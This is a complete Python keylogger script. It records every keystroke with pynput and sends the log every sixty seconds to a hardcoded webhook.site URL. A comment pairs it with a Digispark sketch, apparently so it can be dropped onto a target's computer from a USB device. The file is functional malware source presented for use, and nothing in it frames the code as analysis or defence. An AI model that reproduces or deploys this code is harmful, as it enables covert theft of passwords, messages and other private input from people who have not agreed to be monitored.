import pynput.keyboard
import requests
import threading
import time

# IMPORTANT: Set your webhook URL here. Use the same one you'll put in the Digispark sketch.
webhook_url = "https://webhook.site/bf1c330e-8d62-45d7-986f-6f6291797052"

class Keylogger:
    def __init__(self):
        self.log = ""

    def append_to_log(self, string):
        # Append the captured key to the log
        self.log = self.log + string

    def send_log(self):
        # This function sends the log to the webhook
        if self.log != "":
            try:
                payload = {"content": self.log}
                requests.post(webhook_url, data=payload)
                self.log = ""
            except:
                pass
        
        # Set a timer to call this function again in 60 seconds
        timer = threading.Timer(60, self.send_log)
        timer.start()

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "[ENTER]\n"
            elif key == key.backspace:
                current_key = "[BACKSPACE]"
            else:
                current_key = f" [{str(key)}] "

        self.append_to_log(current_key)

    def start(self):
        # Start listening to the keyboard
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.send_log()
            keyboard_listener.join()

# Start the keylogger
if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()